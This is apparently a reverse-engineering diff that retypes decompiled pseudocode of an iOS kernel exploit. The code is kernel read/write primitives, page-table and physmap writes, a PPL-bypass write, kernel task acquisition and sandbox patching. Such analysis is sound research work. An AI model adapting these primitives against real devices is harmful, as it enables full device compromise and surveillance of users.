@@ -232,7 +232,7 @@ __int64 __fastcall find_connect_ioavservice(__int64 a1);
 __int64 __fastcall get_kernel_task_iokit(__int64 a1);
 __int64 test_appsepmanager_presence();
 void __fastcall necp_send_msg_2(__int64 a1);
-__int64 __fastcall pgtable_locked_kwrite32_retry(__int64 a1, __int64 a2, int a3);
+__int64 __fastcall pgtable_locked_kwrite32_retry(struct_krwCtx *a1, __int64 a2, int a3);
 __int64 __fastcall krw_physmap_ctx_init(__int64 a1);
 unsigned __int64 __fastcall read_cryptex_manifest(struct_krwCtx *a1, unsigned __int64 a2);
 char *__fastcall scan_physmap_state_entries(__int64, uint32_t *, uint32_t *, unsigned __int64);
@@ -11984,7 +11984,7 @@ bool __fastcall check_physmap_range_necp(struct_krwCtx *a1, unsigned __int64 a2,
                           || (xnuVersionPacked > XNU_VERSION_PACKED(8796, 122, 4, 1023, 1023) && a1->xnuMajorVersion <= 10001));
   if ( a13PlusUsesNewNecpPath || a15PlusUsesNewNecpPath )
   {
-    v8 = pgtable_locked_kwrite32_retry((__int64)a1, a2, a3);
+    v8 = pgtable_locked_kwrite32_retry(a1, a2, a3);
     return v8 == 0;
   }
 
@@ -13078,6 +13078,7 @@ __int64 __fastcall get_mach_thread_info(struct_krwCtx *a1, __int64 a2, char *a3,
 __int64 __fastcall find_connect_ioavservice(__int64 a1)
 {
   __int64 v2; // x21
+  struct_krwCtx *ctx; // x21
   unsigned int v3; // w1
   CFMutableDictionaryRef *v4; // x25
   __int64 result; // x0
@@ -13100,13 +13101,14 @@ __int64 __fastcall find_connect_ioavservice(__int64 a1)
   io_connect_t connect; // [xsp+2Ch] [xbp-44h] BYREF
 
   v2 = *(uint64_t *)a1;
+  ctx = KRWCTX_FROM_UINTPTR(v2);
   v3 = *(uint32_t *)(a1 + 8);
   v4 = *(CFMutableDictionaryRef **)(a1 + 16);
   connect = 0;
   v20 = 0;
   v21 = 0;
   properties = 0;
-  result = necp_set_opt_string_6(v2, v3);
+  result = necp_set_opt_string_6(ctx, v3);
   if ( !(uint32_t)result )
     goto LABEL_14;
   result = validate_kaddr_range(v2, *(uint64_t *)(v2 + 912));
@@ -13120,7 +13122,7 @@ __int64 __fastcall find_connect_ioavservice(__int64 a1)
   else
   {
     v6 = (unsigned int)ioservice_get_matching("AppleKeyStore");
-    result = krw_ctx_has_flag((struct_krwCtx *)v2, KRW_CTX_FLAG_MOBILEBACKUP_SANDBOX_PATCHED);
+    result = krw_ctx_has_flag(ctx, KRW_CTX_FLAG_MOBILEBACKUP_SANDBOX_PATCHED);
     if ( !(uint32_t)result )
     {
       v7 = *(uint64_t *)(v2 + 936);
@@ -13137,7 +13139,7 @@ LABEL_14:
   }
   if ( v7 )
   {
-    if ( !necp_set_opt_string_7((struct_krwCtx *)v2, *(uint32_t *)(v2 + 892), 0) )
+    if ( !necp_set_opt_string_7(ctx, *(uint32_t *)(v2 + 892), 0) )
     {
 LABEL_19:
       v10 = 0;
@@ -13145,11 +13147,11 @@ LABEL_19:
     }
     v9 = IOServiceOpen(v6, mach_task_self_, 0, &connect);
     v10 = 0;
-    if ( !necp_set_opt_string_7((struct_krwCtx *)v2, *(uint32_t *)(v2 + 892), v7) || v9 )
+    if ( !necp_set_opt_string_7(ctx, *(uint32_t *)(v2 + 892), v7) || v9 )
       goto LABEL_20;
 LABEL_17:
     iterator[0] = 0;
-    v12 = get_task_kobject_addr((struct_krwCtx *)v2, connect);
+    v12 = get_task_kobject_addr(ctx, connect);
     if ( !v12 )
       goto LABEL_19;
     v13 = v12;
@@ -13160,7 +13162,7 @@ LABEL_17:
       v14 = IOIteratorNext(iterator[0]);
       if ( !v14 )
         break;
-      if ( v13 == get_task_kobject_addr((struct_krwCtx *)v2, v14) )
+      if ( v13 == get_task_kobject_addr(ctx, v14) )
         goto LABEL_27;
       IOObjectRelease(v14);
     }
@@ -13176,7 +13178,7 @@ LABEL_43:
       goto LABEL_20;
     }
     v15 = v13 + 32;
-    if ( kread_physmap_decorated((struct_krwCtx *)v2, v15, (unsigned __int64 *)&v21) )
+    if ( kread_physmap_decorated(ctx, v15, (unsigned __int64 *)&v21) )
     {
       v16 = *(uint64_t *)(v2 + 912);
       if ( *(uint64_t *)(v2 + 344) < XNU_VERSION_PACKED(8019, 0, 0, 0, 0) )
@@ -13200,7 +13202,7 @@ LABEL_35:
         }
         goto LABEL_42;
       }
-      if ( kread_physmap_decorated((struct_krwCtx *)v2, v16 + 136, (unsigned __int64 *)&v20) && validate_kaddr_range(v2, v20) )
+      if ( kread_physmap_decorated(ctx, v16 + 136, (unsigned __int64 *)&v20) && validate_kaddr_range(v2, v20) )
       {
         v16 = v20;
         goto LABEL_35;
@@ -13232,6 +13234,7 @@ LABEL_15:
 __int64 __fastcall get_kernel_task_iokit(__int64 a1)
 {
   __int64 v2; // x21
+  struct_krwCtx *ctx; // x21
   task_inspect_t v3; // w25
   const void *v4; // x20
   host_t v5; // w0
@@ -13270,6 +13273,7 @@ __int64 __fastcall get_kernel_task_iokit(__int64 a1)
   io_master_t io_master[2]; // [xsp+18h] [xbp-58h] BYREF
 
   v2 = **(uint64_t **)a1;
+  ctx = KRWCTX_FROM_UINTPTR(v2);
   v3 = *(uint32_t *)(*(uint64_t *)a1 + 8LL);
   v4 = *(const void **)(*(uint64_t *)a1 + 16LL);
   address = 0;
@@ -13320,7 +13324,7 @@ __int64 __fastcall get_kernel_task_iokit(__int64 a1)
         goto LABEL_56;
       }
       v28 = mach_thread_self();
-      v7 = kwrite_task_kobj_field_via_physmap((struct_krwCtx *)v2, v28, 1, 1, 96);
+      v7 = kwrite_task_kobj_field_via_physmap(ctx, v28, 1, 1, 96);
       if ( v7 )
       {
 LABEL_56:
@@ -13352,10 +13356,10 @@ LABEL_57:
             while ( v30 < suspend_token[1] );
           }
 LABEL_58:
-          if ( necp_set_opt_string_7((struct_krwCtx *)v2, *(uint32_t *)(v2 + 888), 0) )
+          if ( necp_set_opt_string_7(ctx, *(uint32_t *)(v2 + 888), 0) )
           {
             v34 = scan_kernel_page_for_pattern(
-                    (struct_krwCtx *)v2,
+                    ctx,
                     *(uint64_t *)(v2 + 6568),
                     0x28u,
                     *(uint64_t *)(v2 + 912),
@@ -13372,19 +13376,19 @@ LABEL_63:
             v8 = ioservice_notification_send(io_master[1], (__int64)"IOServicePublish", (__int64)BytePtr, v20, io_master[0], 0, 0);
             if ( v8 )
             {
-              v35 = get_task_kobject_addr((struct_krwCtx *)v2, v8);
+              v35 = get_task_kobject_addr(ctx, v8);
               v38 = v35;
               if ( v35 )
               {
-                if ( kread_physmap_decorated((struct_krwCtx *)v2, v35 + 16, &v38)
-                  && kread_physmap_decorated((struct_krwCtx *)v2, v38 + 24, &v38) )
+                if ( kread_physmap_decorated(ctx, v35 + 16, &v38)
+                  && kread_physmap_decorated(ctx, v38 + 24, &v38) )
                 {
                   v36 = *(uint64_t *)(v2 + 912);
                   if ( v36 == v38 )
                   {
                     if ( noppl_kwrite32(v2, v36 + *(int *)(v2 + 360), 255) )
                     {
-                      if ( necp_set_opt_string_7((struct_krwCtx *)v2, *(uint32_t *)(v2 + 888), *(uint64_t *)(v2 + 928)) )
+                      if ( necp_set_opt_string_7(ctx, *(uint32_t *)(v2 + 888), *(uint64_t *)(v2 + 928)) )
                         v23 = 0;
                       else
                         v23 = 163856;
@@ -13495,7 +13499,7 @@ void __fastcall necp_send_msg_2(__int64 a1)
 // 15D00: variable 'vars8' is possibly undefined
 
 //----- (0000000000015D1C) ----------------------------------------------------
-__int64 __fastcall pgtable_locked_kwrite32_retry(__int64 a1, __int64 a2, int a3)
+__int64 __fastcall pgtable_locked_kwrite32_retry(struct_krwCtx *a1, __int64 a2, int a3)
 {
   __int64 v5; // x22
   __int64 v6; // x21
@@ -13515,20 +13519,20 @@ __int64 __fastcall pgtable_locked_kwrite32_retry(__int64 a1, __int64 a2, int a3)
 
   v18 = a3;
   v20 = 0;
-  v5 = *(uint64_t *)(a1 + 7512);
-  v6 = *(uint64_t *)(a1 + 392);
-  if ( !(unsigned int)acquire_write_semaphore_lock(a1, 8u, 0x3A98u) )
+  v5 = KRWCTX_FIELD_U64(a1, 7512);
+  v6 = a1->pageMask;
+  if ( !(unsigned int)acquire_write_semaphore_lock((__int64)a1, 8u, 0x3A98u) )
   {
     if ( !v5 )
     {
-      v7 = krw_physmap_ctx_init(a1);
+      v7 = krw_physmap_ctx_init((__int64)a1);
       if ( (uint32_t)v7 )
         goto LABEL_19;
-      v5 = *(uint64_t *)(a1 + 7512);
+      v5 = KRWCTX_FIELD_U64(a1, 7512);
     }
-    if ( (unsigned int)krw_read_thunk((struct_krwCtx *)a1, a2, 4, v17) )
+    if ( (unsigned int)krw_read_thunk(a1, a2, 4, v17) )
     {
-      v8 = pgtable_walk_wrapper(a1, a2 & ~*(uint64_t *)(a1 + 392), v19);
+      v8 = pgtable_walk_wrapper((__int64)a1, a2 & ~a1->pageMask, v19);
       v7 = 0xFFFFFFFFLL;
       if ( !v8 )
         goto LABEL_19;
@@ -13542,16 +13546,16 @@ __int64 __fastcall pgtable_locked_kwrite32_retry(__int64 a1, __int64 a2, int a3)
       while ( 1 )
       {
         v14 = v13;
-        if ( !(unsigned int)krw_read_thunk((struct_krwCtx *)a1, v11, 8, v19) )
+        if ( !(unsigned int)krw_read_thunk(a1, v11, 8, v19) )
           break;
         v19[0] = (v19[0] & 0xFFFF000000003FFFLL) | v9;
         v7 = 163856;
-        if ( !(unsigned int)kwrite_with_retry(a1, v11, (__int64)v19, 8) )
+        if ( !(unsigned int)kwrite_with_retry((__int64)a1, v11, (__int64)v19, 8) )
           goto LABEL_19;
-        semaphore_timedwait_ns(a1, 0x2710u);
-        if ( !(unsigned int)kwrite_with_retry(a1, v12, (__int64)&v18, 4) )
+        semaphore_timedwait_ns((__int64)a1, 0x2710u);
+        if ( !(unsigned int)kwrite_with_retry((__int64)a1, v12, (__int64)&v18, 4) )
           goto LABEL_19;
-        if ( !(unsigned int)krw_read_thunk((struct_krwCtx *)a1, a2, 4, &v16) )
+        if ( !(unsigned int)krw_read_thunk(a1, a2, 4, &v16) )
           break;
         if ( v16 != v18 )
         {
@@ -13568,7 +13572,7 @@ __int64 __fastcall pgtable_locked_kwrite32_retry(__int64 a1, __int64 a2, int a3)
     }
     v7 = 163855;
 LABEL_19:
-    release_write_semaphore_lock(a1, 8u);
+    release_write_semaphore_lock((__int64)a1, 8u);
     return v7;
   }
   return 708642;
@@ -13579,6 +13583,7 @@ LABEL_19:
 __int64 __fastcall krw_physmap_ctx_init(__int64 a1)
 {
   __int64 v1; // x23
+  struct_krwCtx *ctx; // x23
   unsigned int *v3; // x0
   unsigned int *v4; // x20
   __int64 v5; // x8
@@ -13922,8 +13927,9 @@ __int64 __fastcall krw_physmap_ctx_init(__int64 a1)
   uint64_t v344[2]; // [xsp+690h] [xbp-80h]
   __int64 v345; // [xsp+6A0h] [xbp-70h]
 
+  ctx = KRWCTX_FROM_UINTPTR(a1);
   v1 = 708616;
-  if ( *(uint64_t *)(a1 + 344) < XNU_VERSION_PACKED(8796, 142, 1, 700, 13) || !krw_ctx_has_flag((struct_krwCtx *)a1, KRW_CTX_FLAG_CPU_A13_A14_A15_A16_A17_MASK) )
+  if ( *(uint64_t *)(a1 + 344) < XNU_VERSION_PACKED(8796, 142, 1, 700, 13) || !krw_ctx_has_flag(ctx, KRW_CTX_FLAG_CPU_A13_A14_A15_A16_A17_MASK) )
     return v1;
   if ( *(uint64_t *)(a1 + 7512) )
     return 0;
@@ -13940,7 +13946,7 @@ __int64 __fastcall krw_physmap_ctx_init(__int64 a1)
       v6 = *(uint64_t *)(v5 + 352);
       if ( v6 )
       {
-        if ( (unsigned int)krw_read_thunk((struct_krwCtx *)a1, v6, 552, v3 + 190) )
+        if ( (unsigned int)krw_read_thunk(ctx, v6, 552, v3 + 190) )
           return 0;
       }
     }
@@ -13989,7 +13995,7 @@ __int64 __fastcall krw_physmap_ctx_init(__int64 a1)
       v16 = find_pattern_macho_binary((__int64 *)inputStruct, &v343, v316, 4u);
       if ( v16 )
       {
-        if ( (unsigned int)krw_read_thunk((struct_krwCtx *)a1, (__int64)(v16 + 8), 4, src_address) )
+        if ( (unsigned int)krw_read_thunk(ctx, (__int64)(v16 + 8), 4, src_address) )
         {
           v4[42] = ((LODWORD(src_address[0]) >> 10) & 0xFFF) << (LODWORD(src_address[0]) >> 30);
           LODWORD(src_address[0]) = -218763232;
@@ -14000,7 +14006,7 @@ __int64 __fastcall krw_physmap_ctx_init(__int64 a1)
           {
             v18 = v17;
             v19 = 0;
-            while ( (unsigned int)krw_read_thunk((struct_krwCtx *)a1, (__int64)&v18[v19], 4, v316) )
+            while ( (unsigned int)krw_read_thunk(ctx, (__int64)&v18[v19], 4, v316) )
             {
               if ( (*(uint32_t *)v316 & 0xFFC0001F) == 0xF900001F )
               {
@@ -14014,13 +14020,13 @@ __int64 __fastcall krw_physmap_ctx_init(__int64 a1)
                 if ( v22 )
                 {
                   v23 = v22;
-                  if ( (unsigned int)krw_read_thunk((struct_krwCtx *)a1, (__int64)v22, 4, src_address) )
+                  if ( (unsigned int)krw_read_thunk(ctx, (__int64)v22, 4, src_address) )
                   {
                     v4[46] = ((LODWORD(src_address[0]) >> 10) & 0xFFF) << (LODWORD(src_address[0]) >> 30);
-                    if ( (unsigned int)krw_read_thunk((struct_krwCtx *)a1, (__int64)(v23 + 8), 4, src_address) )
+                    if ( (unsigned int)krw_read_thunk(ctx, (__int64)(v23 + 8), 4, src_address) )
                     {
                       v4[44] = ((LODWORD(src_address[0]) >> 10) & 0xFFF) << (LODWORD(src_address[0]) >> 30);
-                      if ( (unsigned int)krw_read_thunk((struct_krwCtx *)a1, (__int64)(v23 + 12), 4, src_address) )
+                      if ( (unsigned int)krw_read_thunk(ctx, (__int64)(v23 + 12), 4, src_address) )
                       {
                         v4[45] = ((LODWORD(src_address[0]) >> 10) & 0xFFF) << (LODWORD(src_address[0]) >> 30);
                         *(__int128 *)inputStruct = xmmword_42FE0;
@@ -14032,19 +14038,19 @@ __int64 __fastcall krw_physmap_ctx_init(__int64 a1)
                         if ( v24 )
                         {
                           v25 = v24;
-                          if ( (unsigned int)krw_read_thunk((struct_krwCtx *)a1, (__int64)v24, 4, v316) )
+                          if ( (unsigned int)krw_read_thunk(ctx, (__int64)v24, 4, v316) )
                           {
                             v26 = 0;
                             v27 = 0;
                             v4[49] = (unsigned __int16)(*(uint32_t *)v316 >> 5);
-                            while ( (unsigned int)krw_read_thunk((struct_krwCtx *)a1, (__int64)&v25[v26 + 4], 4, v316) )
+                            while ( (unsigned int)krw_read_thunk(ctx, (__int64)&v25[v26 + 4], 4, v316) )
                             {
                               if ( (*(uint32_t *)v316 & 0xFFE0001F) == 0x52800008 )
                               {
                                 if ( v27 == 1 )
                                 {
                                   if ( (unsigned int)krw_read_thunk(
-                                                       (struct_krwCtx *)a1,
+                                                       ctx,
                                                        (__int64)&v25[v26 + 4],
                                                        4,
                                                        v316) )
@@ -14052,7 +14058,7 @@ __int64 __fastcall krw_physmap_ctx_init(__int64 a1)
                                     v91 = 0;
                                     v4[47] = (unsigned __int16)(*(uint32_t *)v316 >> 5);
                                     while ( (unsigned int)krw_read_thunk(
-                                                            (struct_krwCtx *)a1,
+                                                            ctx,
                                                             (__int64)&v25[v26 + 4 + v91],
                                                             4,
                                                             v316) )
@@ -14060,7 +14066,7 @@ __int64 __fastcall krw_physmap_ctx_init(__int64 a1)
                                       if ( *(uint32_t *)v316 == -219794127 )
                                       {
                                         if ( (unsigned int)krw_read_thunk(
-                                                             (struct_krwCtx *)a1,
+                                                             ctx,
                                                              (__int64)&v25[v26 + 12 + v91],
                                                              4,
                                                              v316) )
@@ -14079,7 +14085,7 @@ __int64 __fastcall krw_physmap_ctx_init(__int64 a1)
                                             v96 = v95;
                                             v97 = 0;
                                             while ( (unsigned int)krw_read_thunk(
-                                                                    (struct_krwCtx *)a1,
+                                                                    ctx,
                                                                     (__int64)&v96[v97],
                                                                     4,
                                                                     v316) )
@@ -14087,7 +14093,7 @@ __int64 __fastcall krw_physmap_ctx_init(__int64 a1)
                                               if ( *(uint32_t *)v316 >> 26 == 37 )
                                               {
                                                 if ( (unsigned int)krw_read_thunk(
-                                                                     (struct_krwCtx *)a1,
+                                                                     ctx,
                                                                      (__int64)&v96[v97 - 8],
                                                                      4,
                                                                      v316) )
@@ -14102,7 +14108,7 @@ __int64 __fastcall krw_physmap_ctx_init(__int64 a1)
                                                   if ( v108 )
                                                   {
                                                     if ( (unsigned int)krw_read_thunk(
-                                                                         (struct_krwCtx *)a1,
+                                                                         ctx,
                                                                          (__int64)v108,
                                                                          4,
                                                                          src_address) )
@@ -14115,7 +14121,7 @@ __int64 __fastcall krw_physmap_ctx_init(__int64 a1)
                                                       if ( v109 )
                                                       {
                                                         if ( (unsigned int)krw_read_thunk(
-                                                                             (struct_krwCtx *)a1,
+                                                                             ctx,
                                                                              (__int64)(v109 + 12),
                                                                              4,
                                                                              src_address) )
@@ -14129,7 +14135,7 @@ __int64 __fastcall krw_physmap_ctx_init(__int64 a1)
                                                           if ( v111 )
                                                           {
                                                             if ( (unsigned int)krw_read_thunk(
-                                                                                 (struct_krwCtx *)a1,
+                                                                                 ctx,
                                                                                  (__int64)v111,
                                                                                  4,
                                                                                  src_address) )
@@ -14145,7 +14151,7 @@ __int64 __fastcall krw_physmap_ctx_init(__int64 a1)
                                                                 v113 = v112;
                                                                 v114 = 0;
                                                                 while ( (unsigned int)krw_read_thunk(
-                                                                                        (struct_krwCtx *)a1,
+                                                                                        ctx,
                                                                                         (__int64)&v113[v114],
                                                                                         4,
                                                                                         src_address) )
@@ -14241,14 +14247,14 @@ LABEL_44:
   v29 = lookup_or_resolve_kaddr(a1);
   if ( v29 )
   {
-    v30 = krw_task_for_name(a1, v29, "backboardd");
+    v30 = krw_task_for_name(ctx, v29, "backboardd");
     if ( v30 )
     {
       v31 = *(uint64_t *)(a1 + 7512);
-      v32 = kreadptr((struct_krwCtx *)a1, v30);
+      v32 = kreadptr(ctx, v30);
       if ( v32 )
       {
-        v33 = read_pte_entry_chain((struct_krwCtx *)a1, v32, v316, address);
+        v33 = read_pte_entry_chain(ctx, v32, v316, address);
         if ( v33 )
         {
           if ( *(uint32_t *)v316 )
@@ -14256,7 +14262,7 @@ LABEL_44:
             v34 = v33;
             v35 = 0;
             while ( kread_physmap_decorated(
-                      (struct_krwCtx *)a1,
+                      ctx,
                       v34 + (unsigned int)(LODWORD(address[0]) * v35),
                       (unsigned __int64 *)inputStruct) )
             {
@@ -14272,16 +14278,16 @@ LABEL_44:
                     LODWORD(target_address[0]) = target_address[0] & 0x3FF;
                     if ( v36 == 29 )
                     {
-                      v37 = maybe_ipc_port_get_kobject((struct_krwCtx *)a1, *(unsigned __int64 *)inputStruct);
+                      v37 = maybe_ipc_port_get_kobject(ctx, *(unsigned __int64 *)inputStruct);
                       if ( !v37 )
                         break;
                       v38 = v37;
-                      if ( !kread_physmap_decorated((struct_krwCtx *)a1, v37, src_address) )
+                      if ( !kread_physmap_decorated(ctx, v37, src_address) )
                         break;
                       if ( src_address[0] == *(uint64_t *)(v31 + 216) + 16LL )
                       {
                         if ( (unsigned int)plist_elem_is_string_6(
-                                             (struct_krwCtx *)a1,
+                                             ctx,
                                              *(unsigned __int64 *)inputStruct,
                                              (mach_port_name_t *)&v343) )
                           break;
@@ -14318,11 +14324,11 @@ LABEL_44:
                                     v4[8] = v319;
                                     *((uint8_t *)v4 + 37) = 1;
                                     if ( kread_physmap_decorated(
-                                           (struct_krwCtx *)a1,
+                                           ctx,
                                            *(uint64_t *)(v28 + 224) + *(unsigned int *)(v28 + 168),
                                            (unsigned __int64 *)(v28 + 232))
                                       && kread_physmap_decorated(
-                                           (struct_krwCtx *)a1,
+                                           ctx,
                                            *(uint64_t *)(v28 + 232) + *(unsigned int *)(v28 + 176),
                                            (unsigned __int64 *)(v28 + 240)) )
                                     {
@@ -14358,29 +14364,29 @@ LABEL_44:
                                                 0,
                                                 0)
                                           && kread_physmap_decorated(
-                                               (struct_krwCtx *)a1,
+                                               ctx,
                                                *(uint64_t *)(v28 + 232) + *(unsigned int *)(v28 + 200),
                                                &v311)
                                           && kread_physmap_decorated(
-                                               (struct_krwCtx *)a1,
+                                               ctx,
                                                v311 + *(unsigned int *)(v28 + 204),
                                                &v310)
-                                          && kread_physmap_decorated((struct_krwCtx *)a1, v310 + 8 * v4[7], &v309)
-                                          && kread_physmap_decorated((struct_krwCtx *)a1, v310 + 8 * v4[8], &v308)
+                                          && kread_physmap_decorated(ctx, v310 + 8 * v4[7], &v309)
+                                          && kread_physmap_decorated(ctx, v310 + 8 * v4[8], &v308)
                                           && kread_physmap_decorated(
-                                               (struct_krwCtx *)a1,
+                                               ctx,
                                                v309 + *(unsigned int *)(v28 + 208),
                                                &v307)
                                           && kread_physmap_decorated(
-                                               (struct_krwCtx *)a1,
+                                               ctx,
                                                v308 + *(unsigned int *)(v28 + 208),
                                                &v306)
                                           && kread_physmap_decorated(
-                                               (struct_krwCtx *)a1,
+                                               ctx,
                                                v307 + *(unsigned int *)(v28 + 212),
                                                &v305)
                                           && kread_physmap_decorated(
-                                               (struct_krwCtx *)a1,
+                                               ctx,
                                                v306 + *(unsigned int *)(v28 + 212),
                                                &v304) )
                                         {
@@ -14396,13 +14402,13 @@ LABEL_44:
                                                 v90 = v345 & 0xFFFFFFFFC000LL;
                                                 if ( (v345 & 0xFFFFFFFFC000LL) != 0
                                                   && !(unsigned int)physmap_map_cached(
-                                                                      (struct_krwCtx *)a1,
+                                                                      ctx,
                                                                       v88,
                                                                       (__int64)(v4 + 10)) )
                                                 {
                                                   *((uint64_t *)v4 + 19) = *((uint64_t *)v4 + 5);
                                                   if ( !(unsigned int)physmap_map_cached(
-                                                                        (struct_krwCtx *)a1,
+                                                                        ctx,
                                                                         v90,
                                                                         (__int64)(v4 + 24)) )
                                                   {
@@ -14440,7 +14446,7 @@ LABEL_44:
 LABEL_66:
   *(uint8_t *)v28 = 1;
 LABEL_67:
-  has_flag = krw_ctx_has_flag((struct_krwCtx *)a1, KRW_CTX_FLAG_CPU_A17);
+  has_flag = krw_ctx_has_flag(ctx, KRW_CTX_FLAG_CPU_A17);
   if ( has_flag )
     v40 = 0x292050000LL;
   else
@@ -14449,23 +14455,23 @@ LABEL_67:
     v41 = 0xFFFFFC0000000000LL;
   else
     v41 = 0xFFFFFF8000000000LL;
-  v1 = physmap_map_cached((struct_krwCtx *)a1, v40, (__int64)inputStruct);
+  v1 = physmap_map_cached(ctx, v40, (__int64)inputStruct);
   if ( (uint32_t)v1 )
     goto LABEL_27;
   v42 = **(uint64_t **)inputStruct;
-  v43 = krw_ctx_has_flag((struct_krwCtx *)a1, KRW_CTX_FLAG_CPU_A16_A17_MASK);
+  v43 = krw_ctx_has_flag(ctx, KRW_CTX_FLAG_CPU_A16_A17_MASK);
   v44 = -2;
   if ( !v43 )
     v44 = 0xFFFFFFFFELL;
   v45 = v44 & v42;
   physmap_unmap_cached(a1, (__int64)inputStruct);
   *((uint64_t *)v4 + 33) = v45;
-  v46 = read_cryptex_manifest((struct_krwCtx *)a1, v45);
+  v46 = read_cryptex_manifest(ctx, v45);
   *((uint64_t *)v4 + 31) = v46;
   v47 = 163855;
   if ( !v46 )
     goto LABEL_370;
-  v1 = physmap_map_cached((struct_krwCtx *)a1, *((uint64_t *)v4 + 33), (__int64)inputStruct);
+  v1 = physmap_map_cached(ctx, *((uint64_t *)v4 + 33), (__int64)inputStruct);
   if ( (uint32_t)v1 )
     goto LABEL_27;
   v48 = *(__int64 **)inputStruct;
@@ -14502,7 +14508,7 @@ LABEL_81:
       v57 = v53 / v54;
     while ( 1 )
     {
-      v58 = physmap_map_cached((struct_krwCtx *)a1, v52 + v56 * *(unsigned int *)(a1 + 384), (__int64)src_address);
+      v58 = physmap_map_cached(ctx, v52 + v56 * *(unsigned int *)(a1 + 384), (__int64)src_address);
       if ( (uint32_t)v58 )
         break;
       v59 = *(unsigned int *)(a1 + 384);
@@ -14548,11 +14554,11 @@ LABEL_89:
     v60 += 8;
   }
   while ( v60 != 64 );
-  v70 = read_cryptex_manifest((struct_krwCtx *)a1, v64);
+  v70 = read_cryptex_manifest(ctx, v64);
   *((uint64_t *)v4 + 32) = v70;
   if ( !v70 )
     goto LABEL_26;
-  v71 = read_cryptex_manifest((struct_krwCtx *)a1, v61);
+  v71 = read_cryptex_manifest(ctx, v61);
   *((uint64_t *)v4 + 74) = v71;
   if ( !v71 )
     goto LABEL_26;
@@ -14651,7 +14657,7 @@ LABEL_213:
     goto LABEL_26;
   }
   v99 = v98;
-  v100 = krw_ctx_has_flag((struct_krwCtx *)a1, KRW_CTX_FLAG_CPU_A17);
+  v100 = krw_ctx_has_flag(ctx, KRW_CTX_FLAG_CPU_A17);
   if ( v100 )
     v101 = 0xFFFFFC200008C000LL;
   else
@@ -14670,7 +14676,7 @@ LABEL_213:
       *((uint8_t *)&v344[-2] + (v103 - v102) / v106) = -1;
       goto LABEL_169;
     }
-    if ( (unsigned int)physmap_map_cached((struct_krwCtx *)a1, v104, (__int64)inputStruct) )
+    if ( (unsigned int)physmap_map_cached(ctx, v104, (__int64)inputStruct) )
     {
 LABEL_212:
       free(v99);
@@ -14738,10 +14744,10 @@ LABEL_191:
   else
     v128 = v126;
   v129 = (unsigned __int64)&v124[v122 - v121 + v128];
-  if ( !(unsigned int)lookup_sptm_state_entry(a1, v129, (uint64_t *)v4 + 52) && krw_ctx_has_flag((struct_krwCtx *)a1, KRW_CTX_FLAG_CPU_A13) )
+  if ( !(unsigned int)lookup_sptm_state_entry(a1, v129, (uint64_t *)v4 + 52) && krw_ctx_has_flag(ctx, KRW_CTX_FLAG_CPU_A13) )
     v119[56] = v129;
   *((uint64_t *)v4 + 51) = v123;
-  if ( !v123 || !*((uint64_t *)v4 + 52) || (krw_ctx_has_flag((struct_krwCtx *)a1, KRW_CTX_FLAG_CPU_A13) && !*((uint64_t *)v4 + 56)) )
+  if ( !v123 || !*((uint64_t *)v4 + 52) || (krw_ctx_has_flag(ctx, KRW_CTX_FLAG_CPU_A13) && !*((uint64_t *)v4 + 56)) )
     goto LABEL_26;
   *(uint64_t *)inputStruct = 0xD5033FDFD5033F9FLL;
   *(uint32_t *)&inputStruct[8] = -698416192;
@@ -14781,7 +14787,7 @@ LABEL_249:
   *((uint64_t *)v4 + 54) = v133;
   if ( !v133 )
     goto LABEL_26;
-  if ( !krw_ctx_has_flag((struct_krwCtx *)a1, KRW_CTX_FLAG_CPU_A13_A14_MASK) )
+  if ( !krw_ctx_has_flag(ctx, KRW_CTX_FLAG_CPU_A13_A14_MASK) )
     goto LABEL_221;
   v343 = xmmword_430A0;
   *(uint64_t *)v316 = -1;
@@ -14797,7 +14803,7 @@ LABEL_249:
   if ( !v138 )
     goto LABEL_26;
 LABEL_221:
-  if ( !krw_ctx_has_flag((struct_krwCtx *)a1, KRW_CTX_FLAG_CPU_A13) )
+  if ( !krw_ctx_has_flag(ctx, KRW_CTX_FLAG_CPU_A13) )
     goto LABEL_269;
   *(__int128 *)inputStruct = xmmword_430B0;
   *(uint64_t *)&inputStruct[16] = 3573563583LL;
@@ -14958,7 +14964,7 @@ LABEL_230:
   *(__int128 *)(v4 + 142) = xmmword_43160;
   *((uint64_t *)v4 + 73) = 0xFFFFFFF002018000LL;
 LABEL_269:
-  v175 = krw_ctx_has_flag((struct_krwCtx *)a1, KRW_CTX_FLAG_CPU_A17);
+  v175 = krw_ctx_has_flag(ctx, KRW_CTX_FLAG_CPU_A17);
   v176 = 0xFFFFFC2000000000LL;
   if ( !v175 )
     v176 = 0xFFFFFFA000000000LL;
@@ -14973,10 +14979,10 @@ LABEL_269:
   vm_deallocate(mach_task_self_, *((uint64_t *)v4 + 41), *((uint64_t *)v4 + 42));
   *((uint64_t *)v4 + 41) = 0;
   *((uint64_t *)v4 + 42) = 0;
-  v1 = get_pgtable_walk_result((struct_krwCtx *)a1, *((uint64_t *)v4 + 48), (uint64_t *)v4 + 75);
+  v1 = get_pgtable_walk_result(ctx, *((uint64_t *)v4 + 48), (uint64_t *)v4 + 75);
   if ( (uint32_t)v1 )
     goto LABEL_27;
-  v1 = get_pgtable_walk_result((struct_krwCtx *)a1, *((uint64_t *)v4 + 47), (uint64_t *)v4 + 85);
+  v1 = get_pgtable_walk_result(ctx, *((uint64_t *)v4 + 47), (uint64_t *)v4 + 85);
   if ( (uint32_t)v1 )
     goto LABEL_27;
   v1 = 708617;
@@ -14995,7 +15001,7 @@ LABEL_318:
     v1 = v182;
     goto LABEL_27;
   }
-  if ( krw_ctx_has_flag((struct_krwCtx *)a1, KRW_CTX_FLAG_CPU_A13) )
+  if ( krw_ctx_has_flag(ctx, KRW_CTX_FLAG_CPU_A13) )
     v185 = alloc_physmap_scratch_page(a1, size);
   else
     v185 = alloc_physmap_page(a1, (unsigned int *)size);
@@ -15029,7 +15035,7 @@ LABEL_316:
     goto LABEL_317;
   }
   *(uint64_t *)v295 = v343;
-  if ( !(unsigned int)krw_read_thunk((struct_krwCtx *)a1, v343, 8, target_address) )
+  if ( !(unsigned int)krw_read_thunk(ctx, v343, 8, target_address) )
   {
     v182 = 163855;
     goto LABEL_316;
@@ -15061,7 +15067,7 @@ LABEL_315:
     map_shared_mem_and_transfer_data(a1, v290, LODWORD(size[0]));
     goto LABEL_316;
   }
-  if ( !(unsigned int)krw_read_thunk((struct_krwCtx *)a1, v179[74], 64, inputStruct) )
+  if ( !(unsigned int)krw_read_thunk(ctx, v179[74], 64, inputStruct) )
   {
     v182 = 163855;
     goto LABEL_315;
@@ -15074,12 +15080,12 @@ LABEL_315:
